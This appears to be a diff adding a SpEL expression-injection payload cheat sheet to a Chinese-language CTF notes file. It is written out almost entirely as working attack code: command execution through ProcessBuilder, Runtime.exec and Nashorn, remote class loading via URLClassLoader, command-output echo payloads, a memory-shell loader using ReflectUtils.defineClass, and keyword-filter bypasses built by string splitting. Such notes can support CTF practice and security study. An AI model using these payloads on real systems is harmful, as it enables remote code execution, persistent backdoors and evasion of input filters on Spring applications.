@@ -103,7 +103,38 @@ print(user)#输出加密后的序列化对象
 
 
 ``
+### ezjava
+Spel表达式注入
+```java
+//简单rce
+new java.lang.ProcessBuilder("calc").start()
+T(java.lang.Runtime).getRuntime().exec('calc')
+new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);")
 
+//远程类加载
+new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL('http://127.0.0.1:8888/')}).loadClass("evil").getConstructors()[0].newInstance()
+
+new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL('http://127.0.0.1:8888/')}).loadClass("evil").newInstance()
+
+
+
+//回显
+new java.util.Scanner(new java.lang.ProcessBuilder("ls", "app").start().getInputStream(), "GBK").useDelimiter("asdasdasdasd").next()
+
+new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()
+
+//需要注册一个response上下文
+#response.addHeader('x-cmd',new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine())
+
+
+//内存🐎
+T(org.springframework.cglib.core.ReflectUtils).defineClass('InceptorMemShell',T(org.springframework.util.Base64Utils).decodeFromString(''),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()
+
+//关键字绕过
+T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),newString[]{"cmd","/C","calc"})
+
+''.class.getSuperclass().class.forName('java.lang.Runtime').getMethod("ex"+"ec",T(String[])).invoke(''.class.getSuperclass().class.forName('java.lang.Runtime').getMethod("getRu"+"ntime").invoke(null),'calc')
+```
 
 # reverse
 
